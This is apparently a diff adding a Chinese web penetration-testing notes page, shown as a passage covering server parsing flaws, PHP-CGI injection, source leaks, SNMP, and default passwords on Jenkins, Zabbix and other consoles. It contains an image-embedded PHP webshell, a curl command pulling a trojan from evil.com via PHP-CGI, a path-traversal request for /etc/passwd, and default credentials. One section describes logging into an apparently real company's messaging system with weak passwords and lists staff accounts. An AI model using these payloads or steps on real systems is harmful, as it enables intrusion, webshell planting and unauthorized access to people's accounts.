+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;copy yy.jpg/b + zz.txt/a xx.jpg&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;/b：二进制模式&lt;/p&gt;
+
+&lt;p&gt;/a：ASCII模式&lt;/p&gt;
+
+&lt;p&gt;yy.jpg ：正常图片文件&lt;/p&gt;
+
+&lt;p&gt;zz.txt ：一句话 &amp;lt;?PHP
+fputs(fopen(‘shell.php’,’w’),’&amp;lt;?PHP
+eval($_POST\youxiu)?&amp;gt;’);?&amp;gt;&lt;/p&gt;
+
+&lt;p&gt;shell.php youxiu&lt;/p&gt;
+
+&lt;h2 id=&quot;63-nginx0837&quot;&gt;6.3 Nginx&amp;lt;=0.8.37&lt;/h2&gt;
+
+&lt;p&gt;在Fast-CGI关闭的情况下，Nginx仍然存在解析漏洞：&lt;/p&gt;
+
+&lt;p&gt;在文件路劲(xx.jpg)后面加上%00.php ，即
+xx.jpg%00.php
+会被当做php文件来解析&lt;/p&gt;
+
+&lt;p&gt;参照《Nginx空字节可远程执行代码漏洞》&lt;/p&gt;
+
+&lt;h2 id=&quot;64-apache&quot;&gt;6.4 Apache&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;后缀解析： test.php.x1.x2.x3
+（x1,x2,x3为没有在mime.types文件中定义的文件类型）&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Apache将从右往左开始判断后缀，若x3为非可识别后缀，则判断x2，直到找到可识别后缀为止，然后对可识别后缀进行解析。&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Apache可解析： php&lt;/td&gt;
+      &lt;td&gt;php3&lt;/td&gt;
+      &lt;td&gt;phtml&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;参照《Apache漏洞之后缀名解析漏洞》&lt;/p&gt;
+
+&lt;p&gt;防范：在apache配置文件中添加禁止.php文件执行的语句：&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&amp;lt;Files ~ ”.(php.&lt;/td&gt;
+      &lt;td&gt;php3.&lt;/td&gt;
+      &lt;td&gt;phtml.)”&amp;gt;&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Order Allow,Deny&lt;/p&gt;
+
+&lt;p&gt;Deny from all&lt;/p&gt;
+
+&lt;p&gt;&amp;lt;/Files&amp;gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;若在Apache中，
+.htaccess可被应用（即
+AllowOverride=All）&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;.htaccess可被上传&lt;/p&gt;
+
+&lt;p&gt;则在.htaccess中写入
+(shell.jpg为上传文件，便可得到shell)&lt;/p&gt;
+
+&lt;p&gt;&amp;lt;FilesMatch “shell.jpg”&amp;gt; SetHandler application/x-httpd-php
+&amp;lt;/FilesMatch&amp;gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;65-lighttpd&quot;&gt;6.5 lighttpd&lt;/h2&gt;
+
+&lt;p&gt;xx.jpg/xx.php&lt;/p&gt;
+
+&lt;h2 id=&quot;66-windows环境&quot;&gt;6.6 windows环境&lt;/h2&gt;
+
+&lt;p&gt;Windows环境下，文件 xx.jpg[空格]&lt;/p&gt;
+
+&lt;p&gt;文件 xx.jpg.&lt;/p&gt;
+
+&lt;p&gt;两类文件不允许存在。若这样命名，windows会自动除去空格和点，从而被利用。&lt;/p&gt;
+
+&lt;h1 id=&quot;7-php-cgi远程任意代码执行漏洞&quot;&gt;7 PHP-CGI远程任意代码执行漏洞&lt;/h1&gt;
+
+&lt;p&gt;zone.wooyun.org/content/151&lt;/p&gt;
+
+&lt;p&gt;www.hackbase.com/tech/2012-05-07/66395.html&lt;/p&gt;
+
+&lt;p&gt;该漏洞是用户将HTTP请求参数提交至Apache服务器，通过mod_cgi模块交给后端的php-cgi处理，但在执行过程中部分字符没有得到处理，比如空格、等号（=）、减号（-）等。利用这些字符，攻击者可以向后端的php-cgi解析程序提交恶意数据，php-cgi会将这段“数据”当做php参数直接执行，目前截获到的攻击主要利用以下PHP参数：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_7505e63d7f39ad25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;71-本地包含执行代码&quot;&gt;7.1 本地包含执行代码&lt;/h2&gt;
+
+&lt;p&gt;curl -H “USER-AGENT: &amp;lt;?system(‘id’);die();?&amp;gt;”&lt;/p&gt;
+
+&lt;p&gt;http://target.com/test.php?-dauto_prepend_file%3d/proc/self/environ+-n &lt;/p&gt;
+
+&lt;p&gt;（/proc/self/environ 为本地文件路径）&lt;/p&gt;
+
+&lt;h2 id=&quot;72-远程包含执行代码&quot;&gt;7.2 远程包含执行代码&lt;/h2&gt;
+
+&lt;p&gt;Curl
+http://target.com/test.php?-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3a%2f%2Fwww.evil.com%2fevil.txt &lt;/p&gt;
+
+&lt;p&gt;（%3d = %3a : %2f / ）&lt;/p&gt;
+
+&lt;p&gt;（http://www.evail.com/evil.txt为木马文件）&lt;/p&gt;
+
+&lt;h1 id=&quot;8-fck编辑器上传漏洞&quot;&gt;8 FCK编辑器上传漏洞&lt;/h1&gt;
+
+&lt;h2 id=&quot;81-漏洞利用&quot;&gt;8.1 漏洞利用&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;编辑器本身存在漏洞：更多参见《后台编辑器漏洞手册》&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;编辑器 + web服务器解析漏洞&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;突破后台建立文件夹漏洞（. 变
+_）&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;9-apache-server-status对外暴露&quot;&gt;9 Apache Server Status对外暴露&lt;/h1&gt;
+
+&lt;p&gt;www.ccvita.com/333.html&lt;/p&gt;
+
+&lt;p&gt;Apache 1.3.2及之后的版本自带查看Apache状态的功能模块
+server-status，若设置不严（对公网开放），就会造成信息泄露，例如：真实IP、性能信息、客户端IP、旁站信息等。&lt;/p&gt;
+
+&lt;h2 id=&quot;91-利用方式&quot;&gt;9.1 利用方式&lt;/h2&gt;
+
+&lt;p&gt;未做限制访问的URL为：http://www.apache.org/server-status&lt;/p&gt;
+
+&lt;h1 id=&quot;10-网站备份文件可下载&quot;&gt;10 网站备份文件可下载&lt;/h1&gt;
+
+&lt;p&gt;该问题可能导致源代码泄露，获取web.conf文件，从中得到数据库密码，导致进一步渗透。&lt;/p&gt;
+
+&lt;h2 id=&quot;101-利用方式&quot;&gt;10.1 利用方式&lt;/h2&gt;
+
+&lt;p&gt;常见备份目录为：&lt;/p&gt;
+
+&lt;p&gt;http://www.xxx.com/xxx.rar&lt;/p&gt;
+
+&lt;p&gt;http://www.xxx.com/xxx.zip&lt;/p&gt;
+
+&lt;p&gt;http://aaa.xxx.com/aaa.rar&lt;/p&gt;
+
+&lt;p&gt;http://bbb.xxx.com.cn/bbb.tar&lt;/p&gt;
+
+&lt;p&gt;http://bbb.xxx.com/sysadmin.tar.gz&lt;/p&gt;
+
+&lt;p&gt;ip/www.xxx.com.zip&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;直接在URL中访问，然后下载&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;使用curl工具 例如： curl -I
+http://www.fff.com/fff.zip&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;（curl是利用URL语法在命令行下工作的开原文件传输工具）&lt;/p&gt;
+
+&lt;h1 id=&quot;11-目录遍历并查看敏感数据&quot;&gt;11 目录遍历并查看敏感数据&lt;/h1&gt;
+
+&lt;p&gt;这类漏洞的危害可大可小，一般都是结合具体环境来利用。&lt;/p&gt;
+
+&lt;h2 id=&quot;111-利用方式&quot;&gt;11.1 利用方式&lt;/h2&gt;
+
+&lt;p&gt;根据从wooyun上看到的漏洞，其发现方式主要有:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;wvs扫描目录 (inc，
+返回312，直接访问看到目录列表)&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;常见泄露路径：&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;http://www.xxx.com/caches&lt;/p&gt;
+
+&lt;p&gt;http://www.xxx.com/database&lt;/p&gt;
+
+&lt;p&gt;http://www.xxx.com/..%2f..%2f..%2f..%2fetc%2fpasswd&lt;/p&gt;
+
+&lt;h1 id=&quot;12-snmp信息泄露&quot;&gt;12 SNMP信息泄露&lt;/h1&gt;
+
+&lt;p&gt;drops.wooyun.org/tips/409&lt;/p&gt;
+
+&lt;h2 id=&quot;121-基本原理&quot;&gt;12.1 基本原理&lt;/h2&gt;
+
+&lt;p&gt;SNMP（简单网络管理协议）：该协议能够支持网络管理系统，用以监测连接到网络上的设备是否有任何引起管理上关注的情况。目前共有V1、V2、V3三个版本，应用比较广泛的还是前两个版本，同时存在安全问题也较多。&lt;/p&gt;
+
+&lt;p&gt;Cacti、Mrtg等监控工具都基于snmp协议。其原理可以简单理解为：&lt;/p&gt;
+
+&lt;p&gt;管理主机向被管理的主机或设备发送一个请求（包含community和oid）&lt;/p&gt;
+
+&lt;p&gt;（community相当于认证口令）&lt;/p&gt;
+
+&lt;p&gt;（oid为代号，例如112代表CPU使用率，113代表内存使用率）&lt;/p&gt;
+
+&lt;p&gt;被管理设备收到请求后先查看community是否与自己保持的一致，若一致则返回请求&lt;/p&gt;
+
+&lt;p&gt;信息，若不一致则不返回任何信息。&lt;/p&gt;
+
+&lt;p&gt;此外，管理主机通过snmp协议除了可以获取被管理主机的信息外，还可以修改其配置&lt;/p&gt;
+
+&lt;p&gt;信息（主要是路由交换设备方面）。&lt;/p&gt;
+
+&lt;h2 id=&quot;122-snmp弱口令&quot;&gt;12.2 snmp弱口令&lt;/h2&gt;
+
+&lt;p&gt;snmp服务器的默认密码为public，漏洞发现与扫描：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;x-scan扫描 + GFI LANGard利用&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;使用Snmp Digger进行漏洞利用&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;snmputil.exe&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;snmputil.exe get&lt;/td&gt;
+      &lt;td&gt;getnext&lt;/td&gt;
+      &lt;td&gt;walk agent community oid[oid……]&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;当前进程列表 snmputil.exe walk ip public
+.1.3.6.1.2.1.25.4.2.1.2&lt;/p&gt;
+
+&lt;p&gt;系统用户列表 snmputil.exe walk ip public
+.1.3.6.1.4.1.77.1.2.25.1.1&lt;/p&gt;
+
+&lt;p&gt;列 出 域 名 snmputil.exe walk ip public
+.1.3.6.1.4.1.77.1.4.1.0&lt;/p&gt;
+
+&lt;p&gt;列出安装软件 snmputil.exe walk ip public
+.1.3.6.1.2.1.25.6.3.1.2&lt;/p&gt;
+
+&lt;p&gt;列出系统信息 snmputil.exe walk ip public .1.3.6.1.2.1.1&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;IP Network
+Browser（snmp浏览工具）&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;123-snmp获取管理员密码&quot;&gt;12.3 snmp获取管理员密码&lt;/h2&gt;
+
+&lt;p&gt;snmp默认开放端口: 161&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;H3C防火墙：通过SNMP只读权限的团体字符串便可以读到管理密码，从而控制设备。（WooYun-2013-21877(http://www.wooyun.org/bugs/wooyun-2013-021877)）&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;扫描工具：
+solarwinds中的snmpsweep&lt;/p&gt;
+
+&lt;p&gt;升级版：solarwinds工具包中的 ip browser&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;华为quidway三层交换&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;利用这个OID读出的密码为明文（WooYun-2013-21964(http://www.wooyun.org/bugs/wooyun-2013-021964)）&lt;/p&gt;
+
+&lt;p&gt;root@bt:~# snmpwalk -c private -v 1 x.x.x.x
+1.3.6.1.4.1.2011.5.2.1.10.1&lt;/p&gt;
+
+&lt;p&gt;对于存在该漏洞的设备，目前已知可以获取帐号的oid有一下三个（walk）:&lt;/p&gt;
+
+&lt;p&gt;1.3.6.1.4.1.2011.5.2.1.10.1&lt;/p&gt;
+
+&lt;p&gt;1.3.6.1.4.1.2011.10.2.12.1.1.1&lt;/p&gt;
+
+&lt;p&gt;1.3.6.1.4.1.25506.2.12.1.1.1&lt;/p&gt;
+
+&lt;h2 id=&quot;124-实战演练&quot;&gt;12.4 实战演练&lt;/h2&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;snmpwalk -v 2c -c public xx.xx.xx.xx&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_41e07a3a71e3e362.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;13-svn源码泄露&quot;&gt;13 SVN源码泄露&lt;/h1&gt;
+
+&lt;p&gt;drops.wooyun.org/tips/352(http://drops.wooyun.org/tips/352)&lt;/p&gt;
+
+&lt;h2 id=&quot;131-svn介绍&quot;&gt;13.1 SVN介绍&lt;/h2&gt;
+
+&lt;p&gt;Subversion，简称SVN，是一个开放源代码的版本控制系统。在开源软件的开发过程中，由于开发方式自由和开发人员分散等特性，版本控制问题一直关系到项目成败，没有版本控制开源软件的开发过程就会变得混乱和不可控制。&lt;/p&gt;
+
+&lt;p&gt;Subversion使用服务端—客户端的结构（当然服务端与客户端可以都运行在同一台服务器上）。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。两端间通过各种仓库存取层（Repository
+Access，简称RA）的多条通道（通道中可以通过不同的网络协议比如HTTP、SSH或本地文件等）进行访问的。&lt;/p&gt;
+
+&lt;p&gt;svn默认端口是3690&lt;/p&gt;
+
+&lt;h2 id=&quot;132-漏洞原理&quot;&gt;13.2 漏洞原理&lt;/h2&gt;
+
+&lt;p&gt;程序导出方式：&lt;/p&gt;
+
+&lt;p&gt;在现实开发环境中，建议使用导出功能svn
+export（而不是svn co）&lt;/p&gt;
+
+&lt;p&gt;svn co ：【导出结果带 .svn
+文件夹的目录树】&lt;/p&gt;
+
+&lt;p&gt;svn co http://路径[本地目录全路径]
+–username 用户名 –password 密码&lt;/p&gt;
+
+&lt;p&gt;svn co svn://路径[本地目录全路径]
+–username 用户名 –password 密码&lt;/p&gt;
+
+&lt;p&gt;svn export ：【导出结果不带 .svn
+文件夹的目录树】&lt;/p&gt;
+
+&lt;p&gt;svn export [-r版本号]
+http://路径[本地目录全路径] –username
+用户名 –password 密码&lt;/p&gt;
+
+&lt;p&gt;svn export [-r版本号]
+svn://路径[本地目录全路径] –username
+用户名 –password 密码&lt;/p&gt;
+
+&lt;p&gt;漏洞产生原因：&lt;/p&gt;
+
+&lt;p&gt;在实际开发环境中，很管理员直接把svn
+co导出来的代码放到web目录下，致使 .svn
+隐藏文件夹暴露于外网环境中，恶意攻击者可以借助其中包含的用于版本信息追踪的“entries”文件逐步摸清站点结构。&lt;/p&gt;
+
+&lt;p&gt;漏洞利用方式：&lt;/p&gt;
+
+&lt;p&gt;若 .svn目录没有做访问权限限制，可以通过
+.svn 来遍历文件和目录列表。&lt;/p&gt;
+
+&lt;p&gt;若
+*.php.svn-base被当做php来执行，若暴露php错误信息(真实路径)或空白内容，则该站点存在扩展名问题，找文件上传处上传xx.php.gif文件获取webshell。&lt;/p&gt;
+
+&lt;p&gt;若
+*.php.svn-base不当做php文件执行，则可下载svn中的所有php源码文件。&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;直接在浏览器中访问 /.svn/entries&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;利用seay的svn工具&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;14-hadhoop应用对外访问&quot;&gt;14 hadhoop应用对外访问&lt;/h1&gt;
+
+&lt;h2 id=&quot;141-基础概念&quot;&gt;14.1 基础概念&lt;/h2&gt;
+
+&lt;p&gt;Hadoop是一个由apache基金会所开发的分布式系统基础架构。用户可以在不了解分布式底层细节的情况下，开发分布式程序。充分利用集群的威力进行高速运算和存储。&lt;/p&gt;
+
+&lt;h2 id=&quot;142-漏洞利用&quot;&gt;14.2 漏洞利用&lt;/h2&gt;
+
+&lt;p&gt;默认开放端口：&lt;/p&gt;
+
+&lt;p&gt;hadoop 50070&lt;/p&gt;
+
+&lt;p&gt;hbase 50075&lt;/p&gt;
+
+&lt;p&gt;hdfs 50090&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Hadoop管理界面弱口令，例如：admin 123456
+WooYun-2014-58320(http://www.wooyun.org/bugs/wooyun-2014-058320)&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Hadoop远程命令执行，通过hadoop，hbase，hdfs0.2
+RC版本的管理web端能远程执行命令（jstack
+pstack
+servlet执行命令），通过该节点对集群服务器进行任务分发（该项是基本功能，可以进行批量提权linux主机），从而渗透进hadoop集群。
+WooYun-2013-20282(http://www.wooyun.org/bugs/wooyun-2013-020282)&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;15-nagios信息泄露&quot;&gt;15 Nagios信息泄露&lt;/h1&gt;
+
+&lt;p&gt;Nagios是一个监视系统运行状态和网络信息的监视系统。Nagios能监视所指定的本地或远程主机及服务，可运行在linux、unix平台上，同时提供一个基于浏览器的WEB界面以方便系统管理人员查看网络状态，各种系统问题以及日志等等。&lt;/p&gt;
+
+&lt;h2 id=&quot;151-漏洞利用&quot;&gt;15.1 漏洞利用&lt;/h2&gt;
+
+&lt;p&gt;Nagios运维监控API接口暴露
+WooYun-2014-86842(http://wooyun.org/bugs/wooyun-2014-086842)&lt;/p&gt;
+
+&lt;h1 id=&quot;16-rtx即时通信信息泄露&quot;&gt;16 RTX即时通信信息泄露&lt;/h1&gt;
+
+&lt;p&gt;腾讯通RTX(Real Time
+eXchange)是腾讯公司推出的企业级即时通信平台。企业员工可以轻松地通过服务器配置的组织架构查找需要进行通信的人员，并采用丰富的沟通方式进行实时沟通。文本消息、文本传输、直接语音会话或者视频的形式满足不同办公环境下的沟通需求。&lt;/p&gt;
+
+&lt;h2 id=&quot;161-漏洞利用&quot;&gt;16.1 漏洞利用&lt;/h2&gt;
+
+&lt;p&gt;默认开放端口： 8012&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;开放应用端口暴露：
+http://xx.xx.xx.xx:8012/userlist.php&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;直接可以访问到所有用户id、用户名等信息的json&lt;/p&gt;
+
+&lt;p&gt;在“查看审核结果处”尝试用户名+弱口令(3102
+或123456)登陆，登陆成功后即进入内部网络。&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;得到用户名后，可以读取手机号&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;用户名： rtx.bxlq.com/userlist.php&lt;/p&gt;
+
+&lt;p&gt;手机号：
+rtx.bxlq.com/getmobile.cgi?receiver=用户名&lt;/p&gt;
+
+&lt;h2 id=&quot;162-动手实践&quot;&gt;16.2 动手实践&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://xx.xx.xx.xx:8012/userlist.php&quot;&gt;http://xx.xx.xx.xx:8012/userlist.php&lt;/a&gt; 中国某公司&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_e1c2ee9745806f6d.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;回到首页，查看审核结果处，进行弱口令尝试：高X军
+/ 123456&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_7d72e064c94b344c.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;回到首页，下载并安装客户端进行登陆&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_7624c1251b81f7c6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_da7cf1ecb96eb2d.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;一直连接不上，最后用nmap扫描端口，一个个尝试，最终确定为9002&lt;/p&gt;
+
+&lt;p&gt;高X军 123456&lt;/p&gt;
+
+&lt;p&gt;桂X林 123456&lt;/p&gt;
+
+&lt;p&gt;孔X月 123456&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_9c42e03c9ee49942.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;公司领导&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_4baa431beadedd58.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;17-ganglia系统监控信息泄露&quot;&gt;17 Ganglia系统监控信息泄露&lt;/h1&gt;
+
+&lt;p&gt;Ganglia是UC
+Berkeley发起的一个开源集群监视项目，设计用于测量数以千计的节点。Ganglia的核心包含gmond、gmetad以及一个web前段。主要用来监控系统性能，如cpu、mem、硬盘利用率、I/O负载、网络流量情况等，通过曲线很容易见到每个节点的工作状态，对合理调整、分配系统资源，提高系统整体性能起到重要作用。&lt;/p&gt;
+
+&lt;p&gt;工作原理：&lt;/p&gt;
+
+&lt;p&gt;Ganglia包括如下几个程序，他们之间通过XDR(xml的压缩格式)或者XML格式传递监控数据，达到监控效果。集群内的节点，通过运行gmond收集发布节点状态信息，然后gmetad周期性的轮询gmond收集到的信息，然后存入rrd数据库，通过web服务器可以对其进行查询展示。&lt;/p&gt;
+
+&lt;h2 id=&quot;171-漏洞利用&quot;&gt;17.1 漏洞利用&lt;/h2&gt;
+
+&lt;p&gt;可以查看公司内部流量信息、被监控主机的配置信息及运行状态。&lt;/p&gt;
+
+&lt;p&gt;开放端口：8649
+（不确定，案例中还有开放8000）&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;直接在浏览器地址栏输入IP:8649 eg:
+http://xx.xx.xxx.xx:8649/&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;直接访问域名：ganglia.xx.com&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;使用nc查看： nc.exe iii.com
+8649 |more&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;18-j2ee应用架构web服务器搭配不当&quot;&gt;18 j2ee应用架构（web服务器搭配不当）&lt;/h1&gt;
+
+&lt;p&gt;drops.wooyun.org/papers/60&lt;/p&gt;
+
+&lt;p&gt;在通常的web应用中会将多个web服务器搭配着使用，以解决其中某台服务器的性能缺陷、负载均衡及完成一些分层结构的安全策略等。较常见的如：Nginx+Tomcat的分层结构&lt;/p&gt;
+
+&lt;p&gt;Nginx：高性能的HTTP和反向代理服务器。通过它可以解决一些静态资源(图片、js、css等类型的文件)访问处理。&lt;/p&gt;
+
+&lt;p&gt;Tomcat：免费开放源代码的j2ee
+Web服务器。其性能缺陷：处理静态资源特别是图片文件时特别吃力。&lt;/p&gt;
+
+&lt;h2 id=&quot;181-漏洞成因&quot;&gt;18.1 漏洞成因&lt;/h2&gt;
+
+&lt;p&gt;由于处理方式或分层架构设计，如果对静态资源的目录或文件的映射配置不当，就会引发安全问题(特别是在j2ee应用中)。&lt;/p&gt;
+
+&lt;p&gt;Tomcat的WEB-INF目录(每个j2ee的web应用部署文件默认包含该目录)，在tomcat中该目录禁止访问，包含以下内容：&lt;/p&gt;
+
+&lt;p&gt;classes目录：包含该应用核心的java类编译后的class文件及部分配置文件；&lt;/p&gt;
+
+&lt;p&gt;lib目录：所有框架、插件和组件的架包；&lt;/p&gt;
+
+&lt;p&gt;web.xml目录：重要配置文件。(展开攻击的一把钥匙)&lt;/p&gt;
+
+&lt;p&gt;Nginx在解析静态文件时，把web-inf目录映射进去，若没有做nginx相关安全配置或由于nginx自身缺陷影响，将导致通过nginx访问到tomcat的web-inf目录。&lt;/p&gt;
+
+&lt;p&gt;通常，只配置nginx把与j2ee及开发架或自定义框架有关的url(例如：.jsp
+、.do、.action…等)交给tomcat，剩下的大部分后缀类型的url直接交给nginx处理(包括web-inf中比较重要的.xml、class等类型)。&lt;/p&gt;
+
+&lt;h2 id=&quot;182-漏洞利用&quot;&gt;18.2 漏洞利用&lt;/h2&gt;
+
+&lt;p&gt;该问题普遍存在于大型站点应用中，由于j2ee应用自身的一些特性，例如：起点配置文件web.xml（/WEB-IINF/web.xml），若先找到它并结合j2ee的xml路径配置特点，就可以找到其他的配置文件(需进行反编译)，甚至获得整个应用的所有核心代码及应用架构的相关信息。&lt;/p&gt;
+
+&lt;h2 id=&quot;183-修复方案&quot;&gt;18.3 修复方案&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;最好不要映射非静态文件目录或敏感目录；&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;修改nginx配置文件，禁止访问WEB-INF文件
+:&lt;code class=&quot;highlighter-rouge&quot;&gt;Location ~ ^/WEB-INF/* {deny all;}&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;19-jenkins平台未设置登录验证&quot;&gt;19 Jenkins平台未设置登录验证&lt;/h1&gt;
+
+&lt;p&gt;Jenkins是基于java开发的一种持续集成工具，用于监控持续重复的工作，功能包括：(1)持续的软件版本发布/测试项目；(2)监控外部调用执行的工作。&lt;/p&gt;
+
+&lt;h2 id=&quot;191-漏洞利用&quot;&gt;19.1 漏洞利用&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;未授权访问，可直接执行命令 wooyun-2013-028803&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;直接在url中访问： eg:
+http://xx.xx.xx.xx:8080(http://xx.xx.xx.xx:8080/)
+(端口视具体情况而定，案例中有3000、8888)&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;http://ip/script&quot;&gt;http://ip/script&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;java.lang.Runtime.getRuntime().exec(‘id’).getText();
+行脚本并回显一句话&lt;/p&gt;
+
+&lt;h1 id=&quot;20-zabbix默认口令&quot;&gt;20 zabbix默认口令&lt;/h1&gt;
+
+&lt;h2 id=&quot;201-基础知识&quot;&gt;20.1 基础知识&lt;/h2&gt;
+
+&lt;p&gt;Zabbix除了监控功能强大之处，还可以在忘记root密码的时候重置服务器root密码。（这也是一个超级后门）&lt;/p&gt;
+
+&lt;p&gt;此外，system.run模块可以执行任意指令（agent在root权限下，不过一般都开启该权限）&lt;/p&gt;
+
+&lt;h2 id=&quot;202-利用方式&quot;&gt;20.2 利用方式&lt;/h2&gt;
+
+&lt;p&gt;弱口令进入后台： http://ip/zabbix/ admin / zabbix&lt;/p&gt;
+
+&lt;p&gt;攻击方法：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;尝试system.run执行命令&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;获取zabbix server shell：&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Administrator——&amp;gt;Scripts——&amp;gt;修改Commands(例如改为
+uname -a)&lt;/p&gt;
+
+&lt;p&gt;Monitoring——&amp;gt;Last data——&amp;gt;点击Zabbix
+server，执行调用命令&lt;/p&gt;
+
+&lt;h1 id=&quot;21-zenoss默认口令&quot;&gt;21 zenoss默认口令&lt;/h1&gt;
+
+&lt;h2 id=&quot;211-基本知识&quot;&gt;21.1 基本知识&lt;/h2&gt;
+
+&lt;p&gt;Zenoss
+Core是开源企业级IT管理软件-智能监控软件，允许IT管理员依靠单一的WEB控制台来监控网络架构的状态和健康度。Zenoss同时也是开源的网络与系统管理软件。&lt;/p&gt;
+
+&lt;h2 id=&quot;212-漏洞利用&quot;&gt;21.2 漏洞利用&lt;/h2&gt;
+
+&lt;p&gt;ip:8080 admin / zenoss&lt;/p&gt;
+
+&lt;p&gt;ip:8080/zport/dmd/Dashboard&lt;/p&gt;
+
